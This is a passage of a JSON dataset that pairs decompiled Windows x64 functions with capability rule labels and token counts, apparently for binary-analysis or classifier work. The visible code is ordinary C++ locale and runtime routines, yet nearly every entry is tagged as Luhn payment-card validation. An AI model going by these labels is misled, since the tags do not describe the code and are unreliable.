0x6f) = 0;\n            *(arg1_00 + 1) = 0;\n            *arg1_00 = iVar3 + 0x10;\n            arg1_00[2] = piVar4;\n            fcn.14009fc30(arg1_00);\n            piVar1 = *0x140102a70;\n            arg1_00[3] = arg1;\n            if (*piVar1 == 0) {\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            else {\n                LOCK();\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            arg1_00[4] = piVar4;\n            *arg1_00 = 0x1401097e0;\n            fcn.140081d80(0, arg1, piVar4);\n        }\n        else if (arg2 == *0x140102de0) {\n            arg1_00 = fcn.1400b6520(0x28);\n            fcn.1400aad70(arg1_00, 0);\n            piVar1 = *0x140102a70;\n            arg1_00[4] = arg1;\n            if (*piVar1 == 0) {\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            else {\n                LOCK();\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            *arg1_00 = 0x140109290;\n        }\n        else if (arg2 == *0x140102e10) {\n            arg1_00 = fcn.1400b6520(0x28);\n            piVar4 = fcn.1400b6520(0xd0);\n            *(piVar4 + 1) = 0;\n            iVar3 = *0x140103390;\n            piVar4[2] = 0;\n            piVar4[3] = 0;\n            *(piVar4 + 4) = 0;\n            *piVar4 = iVar3 + 0x10;\n            iVar3 = *0x140103160;\n            piVar4[5] = 0;\n            piVar4[6] = 0;\n            piVar4[7] = 0;\n            piVar4[8] = 0;\n            *(piVar4 + 9) = 0;\n            *(piVar4 + 0x19) = 0;\n            *(arg1_00 + 1) = 0;\n            *arg1_00 = iVar3 + 0x10;\n            arg1_00[2] = piVar4;\n            fcn.1400ab3d0(arg1_00);\n            piVar1 = *0x140102a70;\n            arg1_00[3] = arg1;\n            if (*piVar1 == 0) {\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            else {\n                LOCK();\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            arg1_00[4] = piVar4;\n            *arg1_00 = 0x140109440;\n            fcn.140081930(0, arg1, piVar4);\n        }\n        else if (arg2 == *0x140102dd0) {\n            arg1_00 = fcn.1400b6520(0x20);\n            *(arg1_00 + 1) = 0;\n            *arg1_00 = *0x140103140 + 0x10;\n            iVar3 = fcn.14009f6c0();\n            arg1_00[2] = iVar3;\n            piVar1 = *0x140102a70;\n            arg1_00[3] = arg1;\n            if (*piVar1 == 0) {\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            else {\n                LOCK();\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            *arg1_00 = 0x140109210;\n        }\n        else if (arg2 == *0x140102e30) {\n            arg1_00 = fcn.1400b6520(0x18);\n            *(arg1_00 + 1) = 0;\n            iVar3 = *0x140103180;\n            arg1_00[2] = arg1;\n            *arg1_00 = iVar3 + 0x10;\n            if (**0x140102a70 == 0) {\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            else {\n                LOCK();\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            *arg1_00 = 0x140109590;\n        }\n        else if (arg2 == *0x140102e50) {\n            arg1_00 = fcn.1400b6520(0x18);\n            *(arg1_00 + 1) = 0;\n            iVar3 = *0x1401031a0;\n            arg1_00[2] = arg1;\n            *arg1_00 = iVar3 + 0x10;\n            if (**0x140102a70 == 0) {\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            else {\n                LOCK();\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            *arg1_00 = 0x140109680;\n        }\n        else if (arg2 == *0x140102e70) {\n            arg1_00 = fcn.1400b6520(0x18);\n            *(arg1_00 + 1) = 0;\n            iVar3 = *0x1401031c0;\n            arg1_00[2] = arg1;\n            *arg1_00 = iVar3 + 0x10;\n            if (**0x140102a70 == 0) {\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            else {\n                LOCK();\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            *arg1_00 = 0x140109740;\n        }\n        else if (arg2 == *0x140102db0) {\n            arg1_00 = fcn.1400b6520(0x28);\n            piVar4 = fcn.1400b6520(0x80);\n            *(piVar4 + 1) = 0;\n            iVar3 = *0x140103400;\n            piVar4[2] = 0;\n            piVar4[3] = 0;\n            *(piVar4 + 4) = 0;\n            *piVar4 = iVar3 + 0x10;\n            iVar3 = *0x140103120;\n            *(piVar4 + 0x22) = 0;\n            piVar4[5] = 0;\n            piVar4[6] = 0;\n            piVar4[7] = 0;\n            piVar4[8] = 0;\n            piVar4[9] = 0;\n            piVar4[10] = 0;\n            *(piVar4 + 0xb) = 0;\n            *(piVar4 + 0x5c) = 0;\n            *(piVar4 + 0x7a) = 0;\n            *(arg1_00 + 1) = 0;\n            *arg1_00 = iVar3 + 0x10;\n            arg1_00[2] = piVar4;\n            fcn.1400a0780(arg1_00);\n            piVar1 = *0x140102a70;\n            arg1_00[3] = arg1;\n            if (*piVar1 == 0) {\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            else {\n                LOCK();\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            arg1_00[4] = piVar4;\n            *arg1_00 = 0x140109a80;\n            fcn.140082cd0(0, arg1, piVar4);\n        }\n        else if (arg2 == *0x140102da0) {\n            arg1_00 = fcn.1400b6520(0x28);\n            piVar4 = fcn.1400b6520(0x80);\n            *(piVar4 + 1) = 0;\n            iVar3 = *0x1401033f0;\n            piVar4[2] = 0;\n            piVar4[3] = 0;\n            *(piVar4 + 4) = 0;\n            *piVar4 = iVar3 + 0x10;\n            iVar3 = *0x140103110;\n            *(piVar4 + 0x22) = 0;\n            piVar4[5] = 0;\n            piVar4[6] = 0;\n            piVar4[7] = 0;\n            piVar4[8] = 0;\n            piVar4[9] = 0;\n            piVar4[10] = 0;\n            *(piVar4 + 0xb) = 0;\n            *(piVar4 + 0x5c) = 0;\n            *(piVar4 + 0x7a) = 0;\n            *(arg1_00 + 1) = 0;\n            *arg1_00 = iVar3 + 0x10;\n            arg1_00[2] = piVar4;\n            fcn.1400a03b0(arg1_00);\n            piVar1 = *0x140102a70;\n            arg1_00[3] = arg1;\n            if (*piVar1 == 0) {\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            else {\n                LOCK();\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            arg1_00[4] = piVar4;\n            *arg1_00 = 0x1401099a0;\n            fcn.140082720(0, arg1, piVar4);\n        }\n        else {\n            if (arg2 != *0x140102df0) {\n                arg1_01 = fcn.1400b7080(\"cannot create shim for unknown locale::facet\");\n                fcn.14009f7d0(arg2);\n                do {\n                    fcn.1400b64d0(arg2);\n                    arg1_01 = fcn.14000f000(arg1_01);\n                } while( true );\n            }\n            arg1_00 = fcn.1400b6520(0x28);\n            fcn.1400aaf40(arg1_00, 0);\n            piVar1 = *0x140102a70;\n            arg1_00[4] = arg1;\n            if (*piVar1 == 0) {\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            else {\n                LOCK();\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            *arg1_00 = 0x140109310;\n        }\n    }\n    else {\n        arg1_00 = *ppiVar2;\n    }\n    return arg1_00;\n}\n",
        "token_count": 4563
    },
    "1400298f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.1400298f0(int64_t *arg1, ulong noname_1, uint64_t arg3)\n\n{\n    if (arg3 < arg1[1]) {\n        do {\n            if (*(*arg1 + arg3) != noname_1) {\n                return arg3;\n            }\n            arg3 = arg3 + 1;\n        } while (arg3 != arg1[1]);\n    }\n    return 0xffffffffffffffff;\n}\n",
        "token_count": 103
    },
    "14002b13": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.14002b130(ulong noname_0, ulong s1, ulong s2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = sub.msvcrt.dll_strcoll(s1, s2);\n    return iVar1 >> 0x1e | iVar1 != 0;\n}\n",
        "token_count": 70
    },
    "14002b52": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.14002b520(ulong noname_0, ulong s1, ulong s2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = sub.msvcrt.dll_wcscoll(s1, s2);\n    return iVar1 >> 0x1e | iVar1 != 0;\n}\n",
        "token_count": 71
    },
    "1400401e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.1400401e0(ulong noname_0, ulong s1, ulong s2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = sub.msvcrt.dll_strcoll(s1, s2);\n    return iVar1 >> 0x1e | iVar1 != 0;\n}\n",
        "token_count": 71
    },
    "14004063": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.140040630(ulong noname_0, ulong s1, ulong s2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = sub.msvcrt.dll_wcscoll(s1, s2);\n    return iVar1 >> 0x1e | iVar1 != 0;\n}\n",
        "token_count": 70
    },
    "140059c6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140059c60(ulong noname_0, ulong arg2, ulong arg3)\n\n{\n    int64_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    uint16_t in_R9W;\n    int64_t in_stack_00000028;\n    int64_t in_stack_00000030;\n    int64_t in_stack_00000038;\n    int32_t *in_stack_00000040;\n    \n    if (in_stack_00000028 != 0) {\n        iVar3 = in_stack_00000028 - in_stack_00000038 >> 1;\n        iVar1 = fcn.1400b0190(in_stack_00000030, in_R9W, arg2, arg3);\n        iVar2 = 0;\n        iVar4 = *in_stack_00000040 - iVar3;\n        if (iVar4 != 0) {\n            sub.msvcrt.dll_memcpy(iVar1, in_stack_00000028, iVar4 * 2);\n            iVar2 = *in_stack_00000040 - iVar3;\n        }\n        *in_stack_00000040 = iVar2 + (iVar1 - in_stack_00000030 >> 1);\n        return;\n    }\n    iVar1 = fcn.1400b0190(in_stack_00000030, in_R9W, arg2, arg3);\n    *in_stack_00000040 = iVar1 - in_stack_00000030 >> 1;\n    return;\n}\n",
        "token_count": 333
    },
    "1400ae82": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400ae820(int64_t arg1, int64_t arg2)\n\n{\n    fcn.1400ad200(arg1);\n    fcn.1400ae6e0(arg1, arg1 + 0xd0);\n    *(arg1 + 0xd8) = 0;\n    *(arg1 + 0xe0) = 0;\n    *(arg1 + 0x1c) = 0;\n    *(arg1 + 0xe8) = arg2;\n    *(arg1 + 0x20) = arg2 == 0;\n    return;\n}\n",
        "token_count": 132
    },
    "140078c4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140078c40(int64_t arg1)\n\n{\n    uint uVar1;\n    int64_t iVar2;\n    uint *puVar3;\n    int64_t iVar4;\n    ulong *puVar5;\n    \n    puVar5 = *(arg1 + 0x10);\n    if (puVar5 == NULL) {\n        puVar5 = fcn.1400b6520(0x70);\n        *(puVar5 + 1) = 0;\n        *puVar5 = 0x14010b630;\n        puVar5[2] = 0;\n        puVar5[3] = 0;\n        *(puVar5 + 4) = 0;\n        *(puVar5 + 0x21) = 0;\n        puVar5[5] = 0;\n        puVar5[6] = 0;\n        puVar5[7] = 0;\n        puVar5[8] = 0;\n        puVar5[9] = 0;\n        puVar5[10] = 0;\n        *(puVar5 + 0xb) = 0;\n        *(puVar5 + 0x5c) = 0;\n        *(puVar5 + 0x6f) = 0;\n        *(arg1 + 0x10) = puVar5;\n    }\n    *(puVar5 + 0x21) = 0x2e;\n    *(*(arg1 + 0x10) + 0x22) = 0x2c;\n    iVar2 = *(arg1 + 0x10);\n    *(iVar2 + 0x10) = 0x1400fd5f0;\n    *(iVar2 + 0x28) = 0x1400fd5f0;\n    *(iVar2 + 0x38) = 0x1400fd5f0;\n    *(iVar2 + 0x48) = 0x1400fd5f0;\n    puVar3 = *0x140102bc0;\n    *(iVar2 + 0x18) = 0;\n    uVar1 = *puVar3;\n    *(iVar2 + 0x30) = 0;\n    *(iVar2 + 0x40) = 0;\n    *(iVar2 + 0x50) = 0;\n    *(iVar2 + 0x58) = 0;\n    *(iVar2 + 0x5c) = uVar1;\n    *(*(arg1 + 0x10) + 0x60) = uVar1;\n    iVar2 = **0x140102bd0;\n    iVar4 = 0;\n    do {\n        *(*(arg1 + 0x10) + 100 + iVar4) = *(iVar2 + iVar4);\n        iVar4 = iVar4 + 1;\n    } while (iVar4 != 0xb);\n    return;\n}\n",
        "token_count": 642
    },
    "140078f8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140078f80(int64_t *arg1)\n\n{\n    int64_t *arg1_00;\n    \n    arg1_00 = arg1[2];\n    *arg1 = *0x140103200 + 0x10;\n    if (arg1_00 != NULL) {\n        if (*(*arg1_00 + 8) == 0x14009a4e0) {\n            fcn.14009a510(arg1_00);\n            fcn.1400b64d0(arg1_00);\n        }\n        else {\n            (**(*arg1_00 + 8))();\n        }\n    }\n    return;\n}\n",
        "token_count": 144
    },
    "14007901": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140079010(int64_t arg1)\n\n{\n    uint uVar1;\n    int64_t iVar2;\n    uint *puVar3;\n    int64_t iVar4;\n    ulong *puVar5;\n    \n    puVar5 = *(arg1 + 0x10);\n    if (puVar5 == NULL) {\n        puVar5 = fcn.1400b6520(0x70);\n        *(puVar5 + 1) = 0;\n        *puVar5 = 0x14010b650;\n        puVar5[2] = 0;\n        puVar5[3] = 0;\n        *(puVar5 + 4) = 0;\n        *(puVar5 + 0x21) = 0;\n        puVar5[5] = 0;\n        puVar5[6] = 0;\n        puVar5[7] = 0;\n        puVar5[8] = 0;\n        puVar5[9] = 0;\n        puVar5[10] = 0;\n        *(puVar5 + 0xb) = 0;\n        *(puVar5 + 0x5c) = 0;\n        *(puVar5 + 0x6f) = 0;\n        *(arg1 + 0x10) = puVar5;\n    }\n    *(puVar5 + 0x21) = 0x2e;\n    *(*(arg1 + 0x10) + 0x22) = 0x2c;\n    iVar2 = *(arg1 + 0x10);\n    *(iVar2 + 0x10) = 0x1400fd5f0;\n    *(iVar2 + 0x28) = 0x1400fd5f0;\n    *(iVar2 + 0x38) = 0x1400fd5f0;\n    *(iVar2 + 0x48) = 0x1400fd5f0;\n    puVar3 = *0x140102bc0;\n    *(iVar2 + 0x18) = 0;\n    uVar1 = *puVar3;\n    *(iVar2 + 0x30) = 0;\n    *(iVar2 + 0x40) = 0;\n    *(iVar2 + 0x50) = 0;\n    *(iVar2 + 0x58) = 0;\n    *(iVar2 + 0x5c) = uVar1;\n    *(*(arg1 + 0x10) + 0x60) = uVar1;\n    iVar2 = **0x140102bd0;\n    iVar4 = 0;\n    do {\n        *(*(arg1 + 0x10) + 100 + iVar4) = *(iVar2 + iVar4);\n        iVar4 = iVar4 + 1;\n    } while (iVar4 != 0xb);\n    return;\n}\n",
        "token_count": 641
    },
    "14007935": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140079350(int64_t *arg1)\n\n{\n    int64_t *arg1_00;\n    \n    arg1_00 = arg1[2];\n    *arg1 = *0x140103210 + 0x10;\n    if (arg1_00 != NULL) {\n        if (*(*arg1_00 + 8) == 0x14009ad10) {\n            fcn.14009ad40(arg1_00);\n            fcn.1400b64d0(arg1_00);\n        }\n        else {\n            (**(*arg1_00 + 8))();\n        }\n    }\n    return;\n}\n",
        "token_count": 141
    },
    "1400793e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400793e0(int64_t arg1)\n\n{\n    uint uVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    uint *puVar4;\n    int64_t iVar5;\n    ulong *puVar6;\n    \n    puVar6 = *(arg1 + 0x10);\n    if (puVar6 == NULL) {\n        puVar6 = fcn.1400b6520(0x80);\n        *(puVar6 + 1) = 0;\n        *puVar6 = 0x14010b670;\n        puVar6[2] = 0;\n        puVar6[3] = 0;\n        *(puVar6 + 4) = 0;\n        *(puVar6 + 0x22) = 0;\n        puVar6[5] = 0;\n        puVar6[6] = 0;\n        puVar6[7] = 0;\n        puVar6[8] = 0;\n        puVar6[9] = 0;\n        puVar6[10] = 0;\n        *(puVar6 + 0xb) = 0;\n        *(puVar6 + 0x5c) = 0;\n        *(puVar6 + 0x7a) = 0;\n        *(arg1 + 0x10) = puVar6;\n    }\n    uVar1 = *0x1400fd5f4;\n    puVar6[3] = 0;\n    puVar6[2] = 0x1400fd5f0;\n    *(puVar6 + 0x22) = uVar1;\n    puVar6[5] = 0x1400fd5f2;\n    puVar6[7] = 0x1400fd5f2;\n    puVar6[9] = 0x1400fd5f2;\n    puVar4 = *0x140102bc0;\n    puVar6[6] = 0;\n    uVar1 = *puVar4;\n    puVar6[8] = 0;\n    puVar6[10] = 0;\n    *(puVar6 + 0x5c) = uVar1;\n    *(puVar6 + 0xb) = 0;\n    *(*(arg1 + 0x10) + 0x60) = uVar1;\n    iVar2 = *(arg1 + 0x10);\n    iVar3 = **0x140102bd0;\n    iVar5 = 0;\n    do {\n        *(iVar2 + 100 + iVar5 * 2) = *(iVar3 + iVar5);\n        iVar5 = iVar5 + 1;\n    } while (iVar5 != 0xb);\n    return;\n}\n",
        "token_count": 612
    },
    "14007973": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140079730(int64_t *arg1)\n\n{\n    int64_t *arg1_00;\n    \n    arg1_00 = arg1[2];\n    *arg1 = *0x140103220 + 0x10;\n    if (arg1_00 != NULL) {\n        if (*(*arg1_00 + 8) == 0x14009b530) {\n            fcn.14009b560(arg1_00);\n            fcn.1400b64d0(arg1_00);\n        }\n        else {\n            (**(*arg1_00 + 8))();\n        }\n    }\n    return;\n}\n",
        "token_count": 141
    },
    "1400797c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400797c0(int64_t arg1)\n\n{\n    uint uVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    uint *puVar4;\n    int64_t iVar5;\n    ulong *puVar6;\n    \n    puVar6 = *(arg1 + 0x10);\n    if (puVar6 == NULL) {\n        puVar6 = fcn.1400b6520(0x80);\n        *(puVar6 + 1) = 0;\n        *puVar6 = 0x14010b690;\n        puVar6[2] = 0;\n        puVar6[3] = 0;\n        *(puVar6 + 4) = 0;\n        *(puVar6 + 0x22) = 0;\n        puVar6[5] = 0;\n        puVar6[6] = 0;\n        puVar6[7] = 0;\n        puVar6[8] = 0;\n        puVar6[9] = 0;\n        puVar6[10] = 0;\n        *(puVar6 + 0xb) = 0;\n        *(puVar6 + 0x5c) = 0;\n        *(puVar6 + 0x7a) = 0;\n        *(arg1 + 0x10) = puVar6;\n    }\n    uVar1 = *0x1400fd5f4;\n    puVar6[3] = 0;\n    puVar6[2] = 0x1400fd5f0;\n    *(puVar6 + 0x22) = uVar1;\n    puVar6[5] = 0x1400fd5f2;\n    puVar6[7] = 0x1400fd5f2;\n    puVar6[9] = 0x1400fd5f2;\n    puVar4 = *0x140102bc0;\n    puVar6[6] = 0;\n    uVar1 = *puVar4;\n    puVar6[8] = 0;\n    puVar6[10] = 0;\n    *(puVar6 + 0x5c) = uVar1;\n    *(puVar6 + 0xb) = 0;\n    *(*(arg1 + 0x10) + 0x60) = uVar1;\n    iVar2 = *(arg1 + 0x10);\n    iVar3 = **0x140102bd0;\n    iVar5 = 0;\n    do {\n        *(iVar2 + 100 + iVar5 * 2) = *(iVar3 + iVar5);\n        iVar5 = iVar5 + 1;\n    } while (iVar5 != 0xb);\n    return;\n}\n",
        "token_count": 612
    },
    "140079b1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140079b10(int64_t *arg1)\n\n{\n    int64_t *arg1_00;\n    \n    arg1_00 = arg1[2];\n    *arg1 = *0x140103230 + 0x10;\n    if (arg1_00 != NULL) {\n        if (*(*arg1_00 + 8) == 0x14009bd50) {\n            fcn.14009bd80(arg1_00);\n            fcn.1400b64d0(arg1_00);\n        }\n        else {\n            (**(*arg1_00 + 8))();\n        }\n    }\n    return;\n}\n",
        "token_count": 142
    },
    "140079ba": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140079ba0(int64_t arg1)\n\n{\n    int64_t iVar1;\n    int64_t *piVar2;\n    uchar auVar3 [16];\n    uchar auVar4 [16];\n    \n    piVar2 = *(arg1 + 0x10);\n    auVar4 = CONCAT88(0x1401010d1, 0x1401010d5);\n    auVar3 = CONCAT88(0x1401010d1, 0x14010111c);\n    if (piVar2 == NULL) {\n        piVar2 = fcn.1400b6520(400);\n        iVar1 = *0x1401033b0;\n        *(piVar2 + 1) = 0;\n        *(piVar2 + 0x31) = 0;\n        *piVar2 = iVar1 + 0x10;\n        piVar2[0x30] = 0;\n        *(arg1 + 0x10) = piVar2;\n        *(piVar2 + 2) = 0x0;\n        *(piVar2 + 4) = 0x0;\n        *(piVar2 + 6) = 0x0;\n        *(piVar2 + 8) = 0x0;\n        *(piVar2 + 10) = 0x0;\n        *(piVar2 + 0xc) = 0x0;\n        *(piVar2 + 0xe) = 0x0;\n        *(piVar2 + 0x10) = 0x0;\n        *(piVar2 + 0x12) = 0x0;\n        *(piVar2 + 0x14) = 0x0;\n        *(piVar2 + 0x16) = 0x0;\n        *(piVar2 + 0x18) = 0x0;\n        *(piVar2 + 0x1a) = 0x0;\n        *(piVar2 + 0x1c) = 0x0;\n        *(piVar2 + 0x1e) = 0x0;\n        *(piVar2 + 0x20) = 0x0;\n        *(piVar2 + 0x22) = 0x0;\n        *(piVar2 + 0x24) = 0x0;\n        *(piVar2 + 0x26) = 0x0;\n        *(piVar2 + 0x28) = 0x0;\n        *(piVar2 + 0x2a) = 0x0;\n        *(piVar2 + 0x2c) = 0x0;\n        *(piVar2 + 0x2e) = 0x0;\n    }\n    *(piVar2 + 0x28) = auVar3;\n    *(piVar2 + 0x1c) = auVar4;\n    piVar2[2] = \"%m/%d/%y\";\n    piVar2[3] = \"%m/%d/%y\";\n    piVar2[4] = 0x140101049;\n    piVar2[5] = 0x140101049;\n    piVar2[6] = 0x140101052;\n    piVar2[7] = 0x140101052;\n    piVar2[8] = 0x140101053;\n    piVar2[9] = 0x140101056;\n    piVar2[10] = 0x140101059;\n    piVar2[0xb] = 0x140101065;\n    piVar2[0xc] = 0x14010106c;\n    piVar2[0xd] = 0x140101073;\n    piVar2[0xe] = 0x14010107b;\n    piVar2[0xf] = 0x140101085;\n    piVar2[0x10] = 0x14010108e;\n    piVar2[0x11] = 0x140101095;\n    piVar2[0x12] = 0x14010109e;\n    piVar2[0x13] = 0x1401010a2;\n    piVar2[0x14] = 0x1401010a6;\n    piVar2[0x15] = 0x1401010aa;\n    piVar2[0x16] = 0x1401010ae;\n    piVar2[0x17] = 0x1401010b2;\n    piVar2[0x18] = 0x1401010b6;\n    piVar2[0x19] = 0x1401010ba;\n    piVar2[0x1a] = 0x1401010c2;\n    piVar2[0x1b] = 0x1401010cb;\n    piVar2[0x1e] = 0x1401010db;\n    piVar2[0x1f] = 0x1401010e0;\n    piVar2[0x20] = 0x1401010e5;\n    piVar2[0x21] = 0x1401010ec;\n    piVar2[0x22] = 0x1401010f6;\n    piVar2[0x23] = 0x1401010fe;\n    piVar2[0x24] = 0x140101107;\n    piVar2[0x25] = 0x140101110;\n    piVar2[0x30] = 0x140101138;\n    piVar2[0x26] = 0x140101114;\n    piVar2[0x27] = 0x140101118;\n    piVar2[0x2a] = 0x140101120;\n    piVar2[0x2b] = 0x140101124;\n    piVar2[0x2c] = 0x140101128;\n    piVar2[0x2d] = 0x14010112c;\n    piVar2[0x2e] = 0x140101130;\n    piVar2[0x2f] = 0x140101134;\n    return;\n}\n",
        "token_count": 1391
    },
    "140079fa": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140079fa0(ulong *arg1, ulong arg2, int64_t arg3)\n\n{\n    ulong uVar1;\n    \n    arg1[2] = arg2;\n    *(arg1 + 1) = arg3 != 0;\n    *arg1 = 0x14010a7d0;\n    uVar1 = fcn.14009f6b0();\n    arg1[4] = uVar1;\n    fcn.140079ba0(arg1);\n    return;\n}\n",
        "token_count": 114
    },
    "14007a40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14007a400(int64_t arg1)\n\n{\n    int64_t iVar1;\n    int64_t *piVar2;\n    uchar auVar3 [16];\n    uchar auVar4 [16];\n    \n    piVar2 = *(arg1 + 0x10);\n    auVar4 = CONCAT88(0x14010125e, 0x140101266);\n    auVar3 = CONCAT88(0x14010125e, 0x1401012f4);\n    if (piVar2 == NULL) {\n        piVar2 = fcn.1400b6520(400);\n        iVar1 = *0x1401033c0;\n        *(piVar2 + 1) = 0;\n        *(piVar2 + 0x31) = 0;\n        *piVar2 = iVar1 + 0x10;\n        piVar2[0x30] = 0;\n        *(arg1 + 0x10) = piVar2;\n        *(piVar2 + 2) = 0x0;\n        *(piVar2 + 4) = 0x0;\n        *(piVar2 + 6) = 0x0;\n        *(piVar2 + 8) = 0x0;\n        *(piVar2 + 10) = 0x0;\n        *(piVar2 + 0xc) = 0x0;\n        *(piVar2 + 0xe) = 0x0;\n        *(piVar2 + 0x10) = 0x0;\n        *(piVar2 + 0x12) = 0x0;\n        *(piVar2 + 0x14) = 0x0;\n        *(piVar2 + 0x16) = 0x0;\n        *(piVar2 + 0x18) = 0x0;\n        *(piVar2 + 0x1a) = 0x0;\n        *(piVar2 + 0x1c) = 0x0;\n        *(piVar2 + 0x1e) = 0x0;\n        *(piVar2 + 0x20) = 0x0;\n        *(piVar2 + 0x22) = 0x0;\n        *(piVar2 + 0x24) = 0x0;\n        *(piVar2 + 0x26) = 0x0;\n        *(piVar2 + 0x28) = 0x0;\n        *(piVar2 + 0x2a) = 0x0;\n        *(piVar2 + 0x2c) = 0x0;\n        *(piVar2 + 0x2e) = 0x0;\n    }\n    *(piVar2 + 0x28) = auVar3;\n    *(piVar2 + 0x1c) = auVar4;\n    piVar2[2] = 0x14010113c;\n    piVar2[3] = 0x14010113c;\n    piVar2[4] = L\"%H:%M:%S\";\n    piVar2[5] = L\"%H:%M:%S\";\n    piVar2[6] = 0x140101160;\n    piVar2[7] = 0x140101160;\n    piVar2[8] = 0x140101162;\n    piVar2[9] = 0x140101168;\n    piVar2[10] = L\"%I:%M:%S %p\";\n    piVar2[0xb] = L\"Sunday\";\n    piVar2[0xc] = L\"Monday\";\n    piVar2[0xd] = L\"Tuesday\";\n    piVar2[0xe] = L\"Wednesday\";\n    piVar2[0xf] = L\"Thursday\";\n    piVar2[0x10] = L\"Friday\";\n    piVar2[0x11] = L\"Saturday\";\n    piVar2[0x12] = 0x1401011f8;\n    piVar2[0x13] = 0x140101200;\n    piVar2[0x14] = 0x140101208;\n    piVar2[0x15] = 0x140101210;\n    piVar2[0x16] = 0x140101218;\n    piVar2[0x17] = 